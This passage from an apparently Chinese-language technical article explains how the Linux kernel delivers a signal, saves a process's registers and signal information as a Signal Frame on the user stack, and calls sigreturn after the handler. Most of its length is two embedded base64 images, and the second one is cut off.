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fqPwR6DRAVLamvjvw/7+DKSX8fpvJGvZ+K25cr/z7MjtDiwdXNciIALlIKAXWZYDloKKgAiIgAiIgAiIgAiIgAhULgGtgalc/spdBERABERABERABERABESgHAQkYMoBS0FFQAREQAREQAREQAREQAQql4AETOXyV+4iIAIiIAIiIAIiIAIiIALlICABUw5YCioCIiACIiACIiACIiACIlC5BCRgKpe/chcBERABERABERABERABESgHAQmYcsBSUBEQAREQAREQAREQAREQgcolIAFTufyVuwiIgAiIgAiIgAiIgAiIQDkISMCUA5aCioAIiIAIiIAIiIAIiIAIVC4BCZjK5a/cRUAEREAEREAEREAEREAEykFAAqYcsBRUBERABERABERABERABESgcglIwFQuf+UuAiIgAiIgAiIgAiIgAiJQDgISMOWApaAiIAIiIAIiIAIiIAIiIAKVS0ACpnL5K3cREAEREAEREAEREAEREIFyEJCAKQcsBRUBERABERABERABERABEahcAhIwlctfuYuACIiACIiACIiACIiACJSDwP8DFl4U7KLrdJ4AAAAASUVORK5CYIINCg==)

1. 内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。
2. 内核会为该进程保存相应的上下文，**主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址**。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为Signal     Frame。**需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。

![signal2-stack](data:image/png;base64,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